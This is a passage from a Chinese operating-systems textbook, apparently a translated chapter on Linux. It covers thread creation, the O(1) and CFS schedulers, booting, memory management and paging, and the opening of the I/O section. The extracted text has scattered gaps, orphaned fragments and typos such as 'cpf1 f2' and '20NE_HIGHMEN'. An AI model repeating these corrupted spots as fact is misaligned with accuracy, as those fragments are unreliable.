相似的，CLONE_SIGHAND 位控制是否在新、旧线程间共享信号句柄表。
如果 信号处理函数表是共享的，即使是在拥有不同地址空间的线程之间共享， 一个线程改变某一处理函数也 会影响另一个线程的处理函数。
最后，每一个进程都有一个父进程。
CLONE_PARENT 位控制着哪一个线程是新线程的父线程。
父 线程可以与clone函数调用者的父线程相同(在这种情况下，新线程是clone函数调用者的兄弟),也可 以是clone函数调用者本身，在这种情况下，新线程是clone函数调用者的子线程。
还有另外一些控制其
他项目的位，但是它们不是很重要。
由于Linux 系统为不同的项目维护了独立的数据结构(见10.3.3小节，如调度参数、内存映射等), 因此细粒度的共享成为了可能。
任务数据结构只需要指向这些数据结构即可，所以为每一个线程创建一 个新的任务数据结构变得很容易，或者使它指向旧线程的调度参数、内存映射和其他的数据结构，或者 复制它们。
事实上，条理分明的共享性虽然成为了可能，但并不意味着它是有益的，毕竟传统的UNIX 系统都没有提供这样的功能。
一个利用了这种共享性的Linux程序将不能移植到UNIX系统上。
Linux 系统的线程模型带来了另一个难题。
UNIX 系统为每一个进程分配一个独立的PID, 不论它是 单线程的进程还是多线程的进程。
为了能与其他的UNIX 系统兼容，Linux 对进程标识符 (PID) 和任务 标识符 (TID) 进行了区分。
这两个分量都存储在任务数据结构中。
当调用clone 函数创建一个新进程而 不需要和旧进程共享任何信息时，PID 被设置成一个新值；否则，任务得到一个新的任务标识符，但是 PID不变。
这样一来，一个进程中所有的线程都会拥有与该进程中第一个线程相同的PID。
10.3.4 Linux中的调度
现在我们来关注Linux 系统的调度算法。
首先要认识到，Linux 系统的线程是内核线程，所以Linux 系统的调度是基于线程的，而不是基于进程的。
为了进行调度，Linux 系统将线程区分为三类：
1)实时先入先出。
2)实时轮转。
3)分时。
实时先入先出线程具有最高优先级，它不会被其他线程抢占，除非那是一个刚刚准备好的、拥有更 高优先级的实时先入先出线程。
实时轮转线程与实时先入先出线程基本相同，只是每个实时轮转线程都 有一个时间量，时间到了之后就可以被抢占。
如果多个实时轮转线程都准备好了，每一个线程运行它的 时间量所规定的时间，然后插入到实时轮转线程列表的末尾。
事实上，这两类线程都不是真正的实时线 程。
执行的最后期限无法确定，更无法保证最后期限前线程可以执行完毕。
这两类线程比起分时线程来 说只是具有更高的优先级而已。
Linux 系统之所以称它们为“实时”是因为Linux 系统遵循的P1003.4 标 准 (UNIX 系统对“实时”含义的扩展)使用了这个名称。
在系统内部，实时线程的优先级从0到99,0 是实时线程的最高优先级，99是实时线程的最低优先级。
传统的非实时线程形成单独的类并由单独的算法进行调度，这样可以使非实时线程不与实时线程竞 争资源。
在系统内部，这些线程的优先级从100到139,也就是说，Linux 系统包含140个不同的优先级 (包括实时和非实时任务)。
就像实时轮转线程一样，Linux 系统根据非实时线程的要求以及它们的优先 级分配CPU时间片。
在Linux 系统中，时间片是由时钟周期数来衡量的。
在Linux 以前的版本中，时钟频率如果是 1000Hz, 则每个时钟周期是1ms, 称 为最小时间间隔 (jiffy) 。
在较新的版本中，时钟频率可设置成 500Hz 、250Hz甚至1Hz。
为了避免浪费用于检测定时器中断所用CPU周期，内核甚至可以设置成“滴答” 模式。
该模式在两种情况下是有用的：系统中只有一个进程运行，或CPU处于空闲并且需要进入省电模 式。
最后，在较新的系统中，高分辨率的计时器允许内核跟踪最小时间间隔下更细粒度的时间。
接下来，我们将更详细地讨论Linux 系统的两个调度算法。
它们的内部与调度队列的设计密切相关， 该调度队列是一个关键的数据结构，可以通过调度器来跟踪系统中的所有可运行的任务，并选择下一个 要运行的任务进行调度。
调度队列与系统中的每一个CPU都相关。
这与系统中的任务总数无关。
在O(1) 调度器里，调度队列被组织成两个数组， 一个是任务正在活动的数 组， 一个是任务过期失效的数组。
如图10-10所示，每个数组都包含了140个链表头，每个链表具有不同 的优先级。
链表头指向给定优先级的双向进程链表。
调度的基本操作如下所述。
调度器从正在活动数组中选择一个优先级最高的任务。
如果这个任务的时间片(时间量)过期失效 了，就把它移动到过期失效数组中(可能会插入到优先级不同的列表中)。
如果这个任务阻塞了，比如 说正在等待I/O 事件，那么在它的时间片过期失效之前， 一旦所等待的事件发生，任务就可以继续运行， 它将被放回到之前正在活动的数组中，时间片根据它所消耗的CPU 时间相应的减少。
一旦它的时间片消 耗殆尽，它也会被放到过期失效数组中。
当正在活动数组中没有其他的任务了，调度器交换指针，使得 正在活动数组变为过期失效数组，过期失效数组变为正在活动数组。
这种方法可以保证低优先级的任务 不会被饿死(除非实时先入先出线程完全占用CPU, 但是这种情况是不会发生的)。
不同的优先级被赋予不同的时间片长度，高优先级的进程拥有较长的时间片。
例如，优先级为100 的任务可以得到800ms 的时间片，而优先级为139的任务只能得到5ms 的时间片。
a) 每个CPU上的调度队列
b)CFS 调度中每个CPU的红黑树
图10-10 Linux 调度队列和优先级数组
由 于Linux 系统(或其他任何操作系统)事先不知道一个任务究竟是I/O 密集型的，还是CPU 密集的， 它只是依赖于连续保持的交互启发式方法。
通过这种方式，Linux 系统区分静态优先级和动态优先级。
线程的动态优先级不断地被重新计算，其目的在于：(1)奖励互动进程，(2)惩罚占用CPU 的进程。
在 Linux O(1)调度器中，最高的优先级奖励是-5,是从调度器接收的与更高优先级相对应的较低优先级的 值。
最高的优先级惩罚是+5。
被抢占或时间量过期时，这个变量会相应地减少。
减少的值用来动态生成优先级奖励，奖励的范围从-5 到+5。
当一个线程从正在活动数组移动到过期失效数组中时，调度器会重新计算它的优先级。
O(1) 调度算法指的是2.6内核版本中所流行的调度器，最初引入这个调度算法的是不稳定的2.5版本 内核。
早期的调度算法在多处理器环境中所表现的性能十分低下，并且当任务的数量大量增长时，不能 很好地进行调度。
由于上面描述的内容说明了通过访问正在活动数组就可以做出调度决定，那么调度可 以在一个固定的时间O(1) 内完成，而与系统中进程的数量无关。
然而，除了常数时间操作表现出的高 性能之外，O(1) 调度器有显著的缺点。
最值得注意的是，利用启发式方法来确定一个任务的交互性，会 使该任务的优先级复杂且不完善，从而导致在处理交互任务时性能很糟糕。
为了改进该缺点，O(1) 调度器的开发者Ingo Molnar又提出了一个新的调度器，该调度器被称为完全 公平调度器 (Completely Fair Scheduler,CFS) 。
CFS借鉴Con Kolivas最初为一个早期的调度器所设计 的思路，并在2.6.23版本中首次被集成到内核中。
它仍然是处理非实时任务的默认调度器。
CFS的主要思想是使用一棵红黑树作为调度队列的数据结构。
根据任务在CPU上运行的时间长短而 将其有序地排列在树中，这种时间称为虚拟运行时间 (vruntime) 。
CFS 采用ns级的粒度来说明任务的运 行时间。
如图10-10b所示，树中的每个内部节点对应于一个任务。
左侧的子节点对应于在CPU上运行时 间更少的任务，因此左侧的任务会更早地被调度，右侧的子节点是那些迄今消耗CPU时间较多的任务， 叶子节点在调度器中不起任何作用。
CFS 调度算法可以总结如下，该算法总是优先调度那些使用CPU时间最少的任务，通常是在树中最 左边节点上的任务。
CFS 会周期性地根据任务已经运行的时间，递增它的虚拟运行时间值，并将这个值 与树中当前最左节点的值进行比较，如果正在运行的任务仍具有较小虚拟运行时间值，那么它将继续运 行，否则，它将被插入红黑树的适当位置，并且CPU将执行新的最左边节点上的任务。
调度器只考虑可以运行的任务，这些任务被放在适当的调度队列当中。
不可运行的任务和正在等 待各种I/O操作或内核事件的任务被放入另一个数据结构当中，即等待队列。
每一种任务可能需要等待 的事件对应了一个等待队列。
等待队列的头包含一个指向任务链表的指针及一枚自旋锁。
为了保证等 待队列可以在主内核代码、中断处理函数或其他异步处理请求代码中进行并发操作，自旋锁是非常必 要的。
Linux系统中的同步
上一节中提到Linux 系统使用自旋锁来防止对数据结构的并发修改，比如等待队列。
事实上，内核 代码在很多地方都含有同步变量。
后面会简要总结一下Linux系统所实现的同步机制。
实例研究1: UNIX、Linux和Android 425
具有较高级别的同步构造更为常用。
不想被阻止(考虑到性能或正确性)的线程使用自旋锁并旋转 读/写锁。
当前的Linux版本实现了所谓的“基于门票”自旋锁，它在SMP 和多核系统上具有优秀的表现。
被允许或需要阻塞的线程可使用像互斥量和信号量这样的机制。
Linux 支持像mutex_trylock 和 sem_trywait这样的非阻塞调用，用于在无需阻塞下判断同步变量的状态。
Linux也支持其他的同步变量， 如futexes 、completions 、read-copy-update(RCU) 锁等。
最后，对于内核以及由中断处理事务所执行的代 码之间的同步，可以通过动态地禁用和启用相应的中断来实现。
10.3.5 启 动Linux系统
然 后 ，boot程序读入操作系统内核，并把控制交给内核。
从这里开始，boot程序完成了它的任务， 系统内核开始运行。
内核的启动代码是用汇编语言写成的，具有较高的机器依赖性。
主要的工作包括创建内核堆栈、识 别CPU类型、计算可用内存、禁用中断、启用内存管理单元，最后调用C 语言写成的main函数开始执行 操作系统的主要部分。
C语言代码也有相当多的初始化工作要做，但是这些工作更逻辑化(而不是物理化)。
C 语言代码开 始的时候会分配一个消息缓冲区来帮助调试启动出现的问题。
随着初始化工作的进行，信息被写入消息 缓冲区，这些信息与当前正在发生的事件相关，所以，如果出现启动失败的情况，这些信息可以通过一 个特殊的诊断程序调出来。
我们可以把它当作是操作系统的“飞行信息记录器”(即空难发生后，侦查 员寻找的黑盒子)。
接下来，内核数据结构得到分配。
大部分内核数据结构的大小是固定的，但是一少部分，如页面缓 存和特殊的页表结构，依赖于可用内存的大小。
个硬件设备也不是问题。
一旦所有的硬件都配置好了，接下来要做的事情就是细心地手动运行进程0,建立它的堆栈，运行 它。
进程0继续进行初始化，做如下的工作：配置实时时钟，挂载根文件系统，创建init 进程(进程1) 和页面守护进程(进程2)。
getty 程序为每条连线设置传输速率和其他属性(比如，有一些可能是调制解调器),然后在终端的 屏幕上输出：
login:
图10-11 用于启动一些Linux系统的进程顺序
在图中，0号终端上运行的getty 程序仍然在等待用户输入。
1号终端上，用户已经键入了登录名，所 以getty 程序已经用login 程序替换掉自身，目前正在等待用户输入密码。
2号终端上，用户已经成功登录， shell 程序显示提示符(%)。
然后用户输入
cpf1 f2
shell 程序将调用fork 函数创建一个子进程，并使这个子进程运行cp 程序。
然后shell 程序被阻塞，等待子 进程结束，子进程结束之后，shell 程序会显示新的提示符并且读取键盘输入。
如果2号终端的用户不是 键入了cp 命令而是cc 命 令 ，C 语言编译器的主程序就会被启动，这将生成更多的子进程来运行不同的编 译过程。
10.4 Linux中的内存管理
实例研究1: UNIX、Linux和Android 427
10.4.1 基本概念
每个Linux 进程都有一个地址空间，逻辑上有三段组成：代码、数据和堆栈段。
图10-12a中的进程A 就给出了一个进程空间的例子。
代码段包含了形成程序可执行代码的机器指令。
它是由编译器和汇编器 把C、C++ 或者其他程序源码转换成机器代码而产生的。
通常，代码段是只读的。
由于难以理解和调试， 自修改程序早在大约1950年就不再时兴了。
因此，代码段既不增长也不减少，总之不会发生改变。
图10-12 a) 进程A的虚拟地址空间；b) 物理内存；c) 进程B的虚拟地址空间
未初始化数据的存在实际上仅仅是个优化。
如果一个全局变量未显式地初始化，那么C语言的语义说 明它的初始值是0。
实际上，大部分全局变量并没有显式初始化，因此都是0。
这些可以简单地通过设置 可执行文件的一个段来实现，其大小刚好等于数据所需的字节数，同时初始化包括缺省值为零的所有量。
然而，为了节省可执行文件的空间，并没有这样做。
取而代之的是，跟随在程序代码之后，文件包 含所有显式初始化的变量。
那些未初始化的变量都被收集在初始化数据之后，因此编译器要做的就是在 文件头部放入一个字段说明要分配的字节数。
数据段的大小。
C 库函数malloc 通常被用来分配内存，它就大量使用这个系统调用。
进程地址空间描述 符包含信息：进程动态分配的内存区域(通常叫作堆，heap) 的范围。
第三段是栈段。
在大多数机器里，它从虚拟地址空间的顶部或者附近开始，并且向低地址空间延伸。
例如，在32位x86 平台上，栈的起始地址是0xC0000000, 这是在用户态下对进程可见的3GB 虚拟地址限 制。
如果栈生长到了栈段的底部以下，就会产出一个硬件错误同时操作系统把栈段的底部降低一个页面。
程序并不显式地控制栈段的大小。
当一个程序启动的时候，它的栈并不是空的。
相反，它包含了所有的环境变量以及为了调用它而向 shell输入的命令行。
这样，一个程序就可以发现它的参数了。
比如，当输入以下命令
cp src dest
当两个用户运行同样的程序，比如编辑器，可以在内存中立刻保持该编辑器程序代码的两个副本， 但是并不高效。
相反地，大多数Linux 系统支持共享代码段。
在图10-12a和图10-12c中，可以看到两个进 程A 和B 拥有相同的代码段。
在图10-12b中可以看到物理内存的一种可能布局，其中两个进程共享了同 样的代码片段。
这种映射是通过虚拟内存硬件来实现的。
数据段和栈段从来不共享，除非是同一个父进程下的子进程，并且仅仅是那些没有被修改的页面。
如果二者之一要增长但是没有邻近的空间来增长，这并不会产生问题，因为在虚拟地址空间中邻近的页 面并不一定要映射到邻近的物理页面上。
除了动态分配更多的内存，Linux 中的进程可以通过内存映射文件来访问文件数据。
这个特性使我 们可以把一个文件映射到进程空间的一部分而该文件就可以像位于内存中的字节数组一样被读写。
把一 个文件映射进来使得随机读写比使用read 和write 之类的IO系统调用要容易得多。
共享库的访问就是用 这种机制映射进来后进行的。
在图10-13中，我们可以看到一个文件被同时映射到两个进程中，但在不 同的虚拟地址上。
图10-13 两个进程可以共享一个映射文件
映射一个文件覆盖整个地址空间，从而提供了一种不同进程之间和线程之间的共享方式。
这样地址空间 是共享的(类似于线程),但是每个进程维护其自身的打开文件和信号，这些不同于线程。
实际上，从 来没有两个完全相同的地址空间。
10.4.2 Linux中的内存管理系统调用
POSIX没有给内存管理指定任何系统调用。
这个主题被认为是太依赖于机器而不便于标准化。
可是， 这个问题通过这样的说法被隐藏起来了：那些需要动态内存管理的程序可以使用malloc库函数(由ANSI C标准定义)。
那么malloc 是如何实现的就被推到了POSIX标准之外了。
在一些圈子里，这种方法被认为
是推卸责任。
实际土，许多Linux系统有管理 内存的系统调用。
最常见的列在了 图10-14中。
brk通过给出数据段之外 的第一个字节地址来指定数据段的 大小。
如果新值比原来的要大，那 么数据段变大；反之，数据段缩减。
mmap 和munmap 系统调用控 制内存映射文件。
mmap 的第一个
图10-14 跟内存管理相关的一些系统调用。
若遇到错误则返回码s 为 - 1 ;a 和addr是内存地址，len 是长度，prot 是控制保护， flags是混杂位串，fd 是文件描述符，offset是文件偏移
参 数 ，addr, 决定文件被映射的地址。
它必须是页大小的倍数。
如果这个参数是0,系统确定地址并且 返回到a中。
第二个参数len指示要映射的字节数。
它也必须是页大小的整数倍。
第三个参数prot确定对 映射文件的保护。
它可以标记为可读、可写、可执行或者三者的组合。
第四个参数，flags, 控制文件是 私有的还是共享的以及addr 是一个需求还是仅仅是一个提示。
第五个参数fd是要映射的文件的描述符。
只有打开的文件是可以被映射的，因此为了映射一个文件，首先必须要打开它。
最后，offset 指示从文 件中的什么位置开始映射。
并不一定要从第0个字节开始映射，任何页面边界都是可以的。
另一个调用，unmap, 移除一个被映射的文件。
如果仅仅是文件的一部分撤销映射，那么其他部分 仍然保持映射。
10.4.3 Linux中内存管理的实现
32位机器上的每个Linux进程通常有3GB的虚拟地址空间，还有1GB留给其页表和其他内核数据。
在 用户态下运行时，内核的1GB是不可见的，但是当进程陷入到内核时是可以访问的。
内核内存通常驻留 在低端物理内存中，但是被映射到每个进程虚拟地址空间顶部的1GB 中，在地址0xC0000000 和 0xFFFFFFFF(3～4GB) 之间。
在目前的64位x86机器上，最多只有48位用于寻址，这意味着寻址存储 器的大小的理论极限值为256TB 。
Linux区分内核和用户空间之间的内存，从而导致每个进程最大的虚拟 地址空间为128TB 。
当进程创建的时候，进程地址空间被创建，并且当发生一个exec 系统调用时被重写。
为了允许多个进程共享物理内存，Linux 监视物理内存的使用，在用户进程或者内核构件需要时分 配更多的内存，把物理内存动态映射到不同进程的地址空间中去，把程序的可执行体、文件和其他状态 信息移入移出内存来高效地利用平台资源并且保障程序执行的进展性。
本章的剩余部分描述了在Linux 内核中负责这些操作的各种机制的实现。
1.物理内存管理
在许多系统中由于异构硬件限制，并不是所有的物理内存都能被相同地对待，尤其是对于I/O 和虚 拟内存。
Linux 区分以下内存区域 (zone):
1)ZONE_DMA 和ZONE_DMA32: 可以用于DMA操作的页。
2)ZONE_NORMAL: 正常的，规则映射的页。
3)ZONE_HIGHMEM: 高内存地址的页，并不永久性映射。
内存区域的确切边界和布局是硬件体系结构相关的。
在x86硬件上，一些设备只能在最低的16MB地 址空间进行DMA操作，因此ZONE_DMA 就在0～16MB的范围内。
64位机上对能够执行32位DMA操作 的设备提供了额外的支持，那么ZONE DMA32需要标记这一区域。
此外，i386 等老一代的硬件不能直接
映射896MB以上的内存地址，那么ZONE_HIGHMEM 就应该高于该标记的任何地址。
ZONE_NORMAL 是介于其中的任何地址。
因此在32位x86 平台上，Linux 地址空间的起始896MB是直接映射的，而内核地 址空间的剩余128MB 是用来访问高地址内存区域的。
20NE_HIGHMEN 在x86_64 没有定义内核为每个内 存区域维护一个zone 数据结构，并且可以分别在三个区域上执行内存分配。
Linux 的内存由三部分组成。
前两部分是内核和内存映射，被固定在内存中(页面从来不换出)。
内 存的其他部分被划分成页框，每一个页框都可以包含一个代码、数据或者栈页面， 一个页表页面，或者 在空闲列表中。
内核维护内存的一个映射，该映射包含了所有系统物理内存使用情况的信息，比如区域、空闲页框 等。
如图10-15,这些信息是如下组织的。
· 首先，Linux 维护一个页描述符数组，称为mem_map, 其中页描述符是page 类型的，而且系统当中 的每个物理页框都有一个页描述符。
每个页描述符都有个指针，在页面非空闲时指向它所属的地址空间， 另有一对指针可以使得它跟其他描述符形成双向链表，来记录所有的空闲页框和一些其他的域。
在图 10-15中，页面150的页描述符包含一个到其所属地址空间的映射。
页面70、页面80、页面200是空闲的， 它们是被链接在一起的。
页描述符的大小是32字节，因此整个mem_map 消耗了不到1%的物理内存(对 于4KB的页框)。
因为物理内存被分成区域，所以Linux 为每个区域维护一个区域描述符。
区域描述符包含了每个区 域中内存利用情况的信息，例如活动和非活动页的数目，页面置换算法(本章后面介绍)所使用的高低 水印位，还有许多其他相关信息等。
此外，区域描述符包含一个空闲区数组。
该数组中的第i个元素标记了2个空闲页的第一个块的第一个 页描述符。
既然可能有多块2个空闲页，Linux 使用页描述符的指针对把这些页面链接起来。
这个信息在 Linux的内存分配操作中使用。
在图10-15中，free_area[0]标记所有仅由一个页框组成的物理内存空闲区， 现在指向页面70,三个空闲区当中的第一个。
其他大小为一个页面的空闲块也可通过页描述符中的链接来 获取其地址。
节点描述符
物理内存
图10-15 Linux内存表示
最后，由于Linux 可以移植到NUMA 体系结构(不同的内存地址有不同的访问时间),Linux 使用节
实例研究1: UNIX、Linux和Android 431
点描述符来区分不同节点上的物理内存(同时避免跨节点分配数据结构)。
每个节点描述符包含内存使 用的信息和这个特定节点的区域信息。
在UMA 平台上，Linux 用一个节点描述符记录所有的内存的使用 情况。
每个页描述符的最初一些位是用来指定该页框所属的节点和区域的。
页面
全局页目录 上级页目录 中间页目录 页表
全局目录 上级目录 中间目录 页面 偏移 虚拟地址
图10-16 Linux 使用四级页表
物理内存可以用于多种目的。
内核自身是完全“硬连线”的，它的任何一部分都不会换出。
内存的 其余部分可以作为用户页面、分页缓存和其他目的。
页面缓存保存最近已读的或者由于未来有可能使用 而预读的文件块，或者需要写回磁盘的文件块页面，例如那些被换出到磁盘的用户进程创建的页面。
用 户进行操作时随时变化的页面共同竞争页面缓存这个有限的空间。
分页缓存并不是一个独立的缓存，而 是那些不再需要的或者等待换出的用户页面集合。
如果分页缓存当中的一个页面在被换出内存之前复用， 它可以被快速收回。
2. 内存分配机制
Linux支持多种内存分配机制。
分配物理内存页框的主要机制是页面分配器，它使用了著名的伙伴算法。
管理一块内存的基本思想如下。
刚开始，内存由一块连续的片段组成，图10-17a的简单例子中是64 个页面。
当一个内存请求到达时，首先上舍入到2的幂，比如8个页面。
然后整个内存块被分割成两半， 如图b所示。
因为这些片段还是太大了，较低的片段被再次二分 (c), 然后再二分 (d) 。
现在我们有一 块大小合适的内存，因此把它分配给请求者，如图d所示。
现在假定8个页面的第二个请求到达了。
这个请求有 (e) 直接满足了。
此时需要4个页面的第三个 请求到达了。
最小可用的块被分割 (f), 然后其一半被分配(g) 。
接下来，8页面的第二个块被释放 (h) 。
最后，8页面的另一个块也被释放。
因为刚刚释放的两个邻接的8页面块来自同一个16页面块，它们合并 起来得到一个16页面的块 (i)。
a) b) c) d) e) f) g) h) i)
图10-17 伙伴算法的操作
这个算法导致了大量的内部碎片，因为如果想要65页面的块，必须要请求并且得到一个128页面 的块。
为了缓解这个问题，Linux 有另一个内存分配器，slab 分 配 器。
它使用伙伴算法获得内存块，但是 之后从其中切出slab (更小的单元)并且分别进行管理。
因为内核频繁地创建和撤销一定类型的对象(如task_struct), 它 使 用 了对象缓存。
这些缓存由指向 一个或多个slab的指针组成，而slab 可以存储大量相同类型的对象。
每个slab 要么是满的，要么是部分满 的，要么是空的。
第三个内存分配器vmalloc 也是可用的，并且用于那些仅仅需要连续虚拟地址空间的请求，在物理 内存中它并不适用。
实际上，这一点对于大部分内存分配是成立的。
一个例外是设备，它位于内存总线 和内存管理单元的另一端，因此并不理解虚拟地址。
然而，由于vmalloc 的使用导致一些性能的损失， 因此它主要被用于分配大量连续虚拟地址空间，例如动态插入内核模块。
所有这些内存分配器都是继承 自System V中的那些分配器。
3.虚拟地址空间表示
vm_area_struct 也记录该区是私有的还是跟一个或多个其他进程共享的。
fork 之 后 ，Linux 为子进程 复制一份区链表，但是让父子进程指向相同的页表。
区被标记为可读/可写，但是页面自己却被标记为 只读。
如果任何一个进程试图写页面，就会产生一个保护故障，此时内核发现该内存区逻辑上是可写的， 但是页面却不是可写入的，因此它把该页面的一个副本给当前进程同时标记为可读可写。
这个机制就说
实例研究1: UNIX、Linux和Android 433
明了写时复制是如何实现的。
vm_area_struct 也记录该区是否在磁盘上有备份存储，如果有，在什么地方。
代码段把可执行二进 制文件作为备份存储，内存映射文件把磁盘文件作为备份存储。
其他区，如栈，直到它们不得不被换出， 否则没有备份存储被分配。
10.4.4 Linux中的分页
早期的UNIX系统，每当所有的活动进程不能容纳在物理内存中时就用一个交换进程在内存和磁盘 之间移动整个进程。
Linux 跟其他现代UNIX版本一样，不再移动整个进程了。
内存管理单元是一个页， 并且几乎所有的内存管理部件以页为操作粒度。
交换子系统也是以页为操作粒度的，并且跟页框回收算 法紧耦合在一起。
这个后面会给予描述。
Linux 分页背后的基本思想是简单的：为了运行， 一个进程并不需要完全在内存中。
实际上所需要 的是用户结构和页表。
如果这些被换进内存，那么进程被认为是“在内存中”,可以被调度运行了。
代 码、数据和栈段的页面是动态载入的，仅仅是在它们被引用的时候。
如果用户结构和页表不在内存中， 直到交换器把它们载入内存进程才能运行。
分页是一部分由内核实现而一部分由一个新的进程——页面守护进程实现的。
页面守护进程是进程 2(进程0是idle 进程，传统上称为交换器，而进程1是init, 如图10-11所示)。
跟所有守护进程一样，页 面守护进程周期性地运行。
一旦唤醒，它主动查找是否有工作要干。
如果它发现空闲页面数量太少，就 开始释放更多的页面。
页面只有在需要的时候才在分页设备或者分区上被分配。
每个设备和文件由一个位图开始说明哪些 页面是空闲的。
当一个没有备份存储的页面必须换出的时候，仍有空闲空间的最高优先级的分页分区或 者文件被选中并且在其上面分配一个页面。
正常情况下，分页分区(若存在)拥有比任何分页文件更高 的优先级。
页表被及时更新以反映页面已经不在内存了(如，page-not-present 位被设置)同时磁盘位置 被写入到页表项。
页面置换算法
首 先 ，Linux 区分四种不同的页面：不可回收的 (unreclaimable) 、 可交换的 (swappable) 、 可同步 的 (syncable) 、 可丢弃的 ( discardable) 。
不可回收页面包括保留或者锁定页面、内核态栈等，不会被 换出。
可交换页必须在回收之前写回到交换区或者分页磁盘分区。
可同步的页面如果被标记为dirty 就必 须要写回到磁盘。
最后，可丢弃的页面可以被立即回收。
在启动的时候，init 开启一个页面守护进程kswapd (每个内存节点都有一个),并且配置它们能周期 性运行。
每次kswapd被唤醒，它通过比较每个内存区域的高低水位和当前内存的使用来检查是否有足够
的空闲页面可用。
如果有足够的空闲页面，它就继续睡眠。
当然它也可以在需要更多页面时被提前唤醒。
如果任何内存区域的可用空间低于一个阈值，kswapd 初始化页框回收算法。
在每次运行过程中，仅有一 个确定数目的页面被回收，典型值是最大值32。
这个值是受限的，以控制I/O压力(由PFRA 操作导致的 磁盘写的次数)。
回收页面的数量和扫描页面的总数量都是可配置的参数。
PFRA 用一个类似时钟的算法来选择旧页面换出。
这个算法的核心是一个循环，它扫描每个区域的 活动和非活动列表，试图按照不同的紧迫程度回收不同类型的页面。
紧迫性数值作为一个参数传递给该 过程，说明花费多大的代价来回收一些页面。
通常，这意味着在放弃之前检查多少个页面。
在PFRA期间，页面按照图10-18描述的方式在活动和非活动列表之间移来移去。
为了维护一些启发 式方法并且尽量找出没有被引用的和近期不可能被使用的页面，PFRA 为每个页面维护两个标记：活动/
非活动和是否被引用。
这两个标记构成四种状态，如 图10-18所示。
在对一个页面集合的第一遍扫描中， PFRA 首先清除它们的引用位。
如果在第二次运行期 间确定它已经被引用，则把它提升到另一个状态，这 样就不太可能回收它了。
否则，将该页面移动到一个 更可能被回收的状态。
处在非活动列表上的页面，自从上次检查未被 引用过，故而是移出的最佳候选。
有些页面的 PG_active 和PG_referenced 都被置为0,如图10-18所 示。
然而，如果需要，处于其他状态的页面也可能 会被回收。
图10-18中的重装箭头就说明这个事实。
PFRA 维护一些页面，尽管这些页面可能已经被 引用但在非活动列表中，其原因是为了避免如下的情
非活动 活 动
图10-18 页框置换算法中考虑的页面状态
形。
考虑一个进程周期性访问不同的页面，比如周期为1个小时。
从最后一次循环开始被访问的页面会设 置其引用标志位。
然而，接下来的一个小时里不再使用它，没有理由不考虑把它作为一个回收的候选。
我们还没有提及的内存管理系统的一个方面是另一个守护进程pdflush, 实际上就是一组后台守护线 程 。
pdflush 线程要么(1)周期性醒来(通常是每500ms), 把非常旧的“脏”(dirty) 页面写回到磁盘， 要么(2)当可用的内存水平下降到一个阈值时由内核显式唤醒，把页面缓存的“脏”页面写回到磁盘。
在便携模式 (laptop mode) 下，为了保留电池寿命，每次pdflush 线程醒来，“脏”页面就被写到磁盘。
“脏”页面也可以通过显式的同步请求写出到磁盘，比如通过系统调用sync 、fsync 或者fdatasync 。
更 早 的Linux版本使用两个单独的守护进程：kupdate, 用于写回旧页面；bdflush, 用于在低内存的情况下写 回页面。
在2 .4版本内核中这个功能被整合到pdflush 线程当中了。
选择多线程是为了隐藏长的磁盘延迟。
10.5 Linux中 的I/O 系 统
Linux 和其他的UNIX系统 一 样，I/O 系统都相当的简单明了。
通常情况下，所有的I/O设备都被当作 文件来处理，并且通过与访问所有文件同样的read 和write 系统调用来访问。
在某些情况下，必须通过一 个特殊的系统调用来设置设备的参数。
我们会在下面的章节中学习这些细节。
10.5.1 基本概念
像所有的计算机一样，运行Linux的计算机具有磁盘、打印机、网络等I/O 设备。
需要一些策略才能
使程序能够访问这些设备。
有很多不同的方法都可以达到这个目的，Linux 把设备当作一种特殊文件整 合到文件系统中。
每个I/O设备都被分配了一条路径，通常在/dev目录下。
例如： 一个磁盘的路径可能是 “/dev/hd1”, 一个打印机的路径可能是“/dev/lp”, 网络的路径可能是“/dev/net”。
可以用与访问其他普通文件相同的方式来访问这些特殊文件。
不需要特殊的命令或者系统调用。
常 用的open、read、write 等系统调用就够用了。
例如：下面的命令
cp file /dev/lp
把文件 “file” 复制到打印机“/dev/lp”, 然后开始打印(假设用户具有访问“/dev/lp” 的权限)。
程序能 够像操作普通文件那样打开、读、写特殊文件。
实际上，上面的 “cp” 命令甚至不知道是要打印 “file” 文件。
通过这种方法，不需要任何特殊的机制就能进行I/O。
特殊文件(设备)分为两类，块特殊文件和字符特殊文件。
一个块特殊文件由一组具有编号的块组 成。
块特殊文件的主要特性是：每一个块都能够被独立地寻址和访问。
也就是说， 一个程序能够打开一 个块特殊文件，并且不用读第0块到第123块就能够读第124块。
磁盘就是块特殊文件的典型应用。
字符特殊文件通常用于表示输入和输出字符流的设备。
键盘、打印机、网络、鼠标、绘图机以及大 部分接受用户数据或向用户输出数据的设备都使用字符特殊文件来表示。
访问一个鼠标的第124块是不 可能的(甚至是无意义的)。
每个特殊文件都和一个处理其对应设备的设备驱动相关联。
每个驱动程序都通过一个主设备号来标 识。
如果一个驱动程序支持多个设备，如，相同类型的两个磁盘，每个磁盘使用一个次设备号来标识。
主设备号和次设备号结合在一起能够唯一地确定每个I/O 设备。
在很少的情况下， 一个单独的驱动程序 处理两种关系密切的设备。
比如：与“/dev/tty” 联合的驱动程序同时控制着键盘和显示器，这两种设备 通常被认为是一种设备，即终端。
大部分的字符特殊文件都不能够被随机访问，因此它们通常需要用不同于块特殊文件的方式来控制。
比如，由键盘上键入输入字符并显示在显示器上。
当一个用户键入了一个错误的字符，并且想取消键入 的最后一个字符时，他敲击其他的键。
有人喜欢使用“backspace” 回退键，也有人喜欢 “del” 删除键。
类似地，为了取消刚键入的一行字符，也有很多方法。
传统的方法是输入“@”,但是随着e-mail 的传播 (在电子邮件地址中使用@),一些系统使用“CTRL+U” 或者其他字符来达到目的。
同样的，为了中断 正在运行的程序，需要使用一些特殊的键。
不同的人有不同的偏爱。
“CTRL+C” 是常用的方法，但不 是唯一的。
Linux允许用户自定义这些特殊的功能，而不是强迫每个人使用系统选择的那种。
Linux 提供了一个 专门的系统调用来设置这些选项。
这个系统调用也处理tab扩展，字符输出有效、失效，回车和换行之间 的转换等类似的功能。
这个系统调用不能用于普通文件和块特殊文件。
10.5.2 网 络
I/O的另外一个例子是网络，由Berkeley 计中，关键概念是套接字 (socket) 。
套
接字与邮筒和墙壁上的电话插座是类似 的，因为套接字允许用户连接到网络， 正如邮筒允许用户连接到邮政系统，墙 壁上的电话插座允许用户插入电话并且 连接到电话系统。
套接字的位置见图10- 19。
套接字可以被动态创建和销毁。
创 建一个套接字成功后，系统返回一个文 件描述符。
创建连接、读数据、写数据、 解除连接时要用到这个文件描述符。
每个套接字支持一种特定的网络
